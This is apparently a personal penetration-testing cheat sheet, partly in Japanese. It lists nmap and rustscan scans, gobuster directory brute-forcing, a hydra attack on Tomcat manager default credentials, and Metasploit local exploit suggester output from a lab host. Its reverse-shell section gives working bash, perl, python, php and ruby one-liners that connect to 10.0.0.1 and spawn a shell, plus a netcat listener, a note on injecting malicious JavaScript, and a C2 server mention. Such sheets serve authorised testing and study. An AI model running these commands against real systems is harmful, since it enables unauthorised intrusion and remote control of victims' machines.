# Cheat Sheet


## Enumeration
### nmap
- 全ポートスキャン: `nmap -sS -A -T4 -Pn -p- $IP`
- 特定ポートのチェック: `nmap -sS -A -p[port] --script vuln $IP`

### rustscan
- installation: `sudo snap install -y rustscan`
- 全ポートスキャン: `rustscan -a $IP --ulimit 10000 -- -Pn -A --script vuln > rustscan.log`

### gobuster
- ディレクトリやファイルの探索
  - `gobuster -u http://$IP -w ~/tools/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -t 50`

## Password Cracking
### hydra
- webサービスで総当たりする
- Basic認証総当たり(`user:pass`形式のコーパス): `hydra -C ~/tools/wordlists/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-post://$IP:8080/manager/html`


## Exploitation
### Webshell
- web上でコマンド実行できる
- https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html

### msfvenom
- metasploitのペイロードを取れる
- ペイロードの列挙: `msfvenom -l payloads`


## Privesc
### local exploit suggester
- meterpreter shell をバックグラウンドに移し、```use post/multi/recon/local_exploit_suggester``` する
- sesionオプションを指定し、run 
  ```msf6 exploit(windows/iis/iis_webdav_upload_asp) > use post/multi/recon/local_exploit_suggester
  msf6 post(multi/recon/local_exploit_suggester) > options

  Module options (post/multi/recon/local_exploit_suggester):

     Name             Current Setting  Required  Description
     ----             ---------------  --------  -----------
     SESSION                           yes       The session to run this module on
     SHOWDESCRIPTION  false            yes       Displays a detailed description for the available e
                                                 xploits

  msf6 post(multi/recon/local_exploit_suggester) > set session 3
  session => 3
  msf6 post(multi/recon/local_exploit_suggester) > run

  [*] 10.10.10.15 - Collecting local exploits for x86/windows...
  [*] 10.10.10.15 - 37 exploit checks are being tried...
  [+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
  [+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
  [+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
  [+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
  [+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
  [+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
  [*] Post module execution completed
  ```



## Reverse shells
### Receiver
- `nc -lnvp 4444`

### sender
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- bash: `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
- perl: `perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
- python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
- php: `php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`
- ruby: `ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`


## Miscellaneous
### SimpleHTTPserver
- カレントディレクトリをルートとした簡易Webサーバを立てることができる．
  - ```sudo python -m SimpleHTTPServer [port]```
- 対象サーバで```<script src="http://.../a.js">```により任意の悪意のあるJavaScriptを実行させることなどが可能

### SilentTrinity
- C2 server を立てることができる
